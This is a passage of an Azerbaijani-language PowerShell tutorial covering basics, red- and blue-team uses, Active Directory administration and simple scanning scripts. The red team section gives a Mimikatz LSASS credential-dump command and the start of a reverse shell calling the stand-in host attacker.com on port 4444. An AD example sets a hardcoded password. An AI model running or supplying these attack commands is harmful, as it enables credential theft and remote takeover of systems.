1. Giriş: PowerShell nədir?

PowerShell – Microsoft tərəfindən hazırlanmış, həm komanda sətri mühiti (CLI), həm də scripting dili olan bir platformadır. Əsas üstünlüyü onun object-based (obyekt yönlü) yanaşması və .NET Framework ilə inteqrasiya imkanlarıdır.

PowerShell Windows-da doğma olaraq gəlir, lakin PowerShell 7 ilə birlikdə artıq cross-platform (Linux və macOS-da da işləyir) olmuşdur.

2. PowerShell Scripting nədir?

PowerShell scripting, .ps1 uzantılı fayllarda komandaların, funksiyaların və loqikaların yazılması və avtomatik icrası prosesidir. Həm GUI-less əməliyyatlar, həm də kompleks sistem inteqrasiyası üçün istifadə olunur.

3. PowerShell-in Əsas Xüsusiyyətləri

Xüsusiyyət İzahı
Object-based Output Komandalar nəticə olaraq mətn yox, obyekt qaytarır
Cmdlet Sistemi Əmrlər Verb-Noun formatında yazılır (Get-Process)
Remote Execution Uzaq sistemlərə ssenarilər göndərmək mümkündür
Pipeline Əməliyyatları Komandalar arasında məlumat ötürmə
.NET Əlaqəliliyi Bütün .NET metodlarına çıxış mümkündür

9. PowerShell və Kiber Təhlükəsizlik

9.1. Red Team Tətbiqləri

PowerShell, Red Team-lər üçün çox güclü bir vasitədir:

Mimikatz ilə LSASS Dump:

Invoke-Mimikatz -DumpCreds

Empire, Nishang və PowerSploit:

Bu frameworklər PowerShell skriptləri vasitəsilə müxtəlif hücum ssenariləri təqdim edir: keylogging, credential stealing, privilege escalation və s.

Reverse Shell:

$client = New-Object System.Net.Sockets.TCPClient("attacker.com",4444);$stream = $client.GetStream();...

Qeyd: Bu kodlar yalnız maarifləndirici məqsəd daşıyır!

9.2. Blue Team Tətbiqləri

Event Log Monitorinq:

Get-WinEvent -LogName Security | Where-Object {$_.ID -eq 4625}

Port İzləmə:

Get-NetTCPConnection | Where-Object {$_.State -eq "Listen"}

Sistem dəyişikliklərinin qeydiyyatı:

Register-WmiEvent -Class Win32_LogicalDisk -Action { Write-Host "Disk dəyişdi!" }

10. Active Directory ilə İşləmə

PowerShell AD ilə doğma inteqrasiya dəstəyi verir.

İstifadəçi Yaratmaq:

New-ADUser -Name "Cyberus" -GivenName "Cyber" -Surname "Us" -SamAccountName "cyberus" -AccountPassword (ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force) -Enabled $true

Qrupa Əlavə Etmək:

Add-ADGroupMember -Identity "IT-Admins" -Members "cyberus"

11. Təhlükəsizlik Skanerləri üçün Skriptlər

Web port scanning:

1..100 | ForEach-Object {
    Test-NetConnection -ComputerName target.com -Port $_
}

Subdomain Checker:

$subs = Get-Content sublist.txt
foreach ($sub in $subs) {
    Resolve-DnsName "$sub.target.com" -ErrorAction SilentlyContinue
}
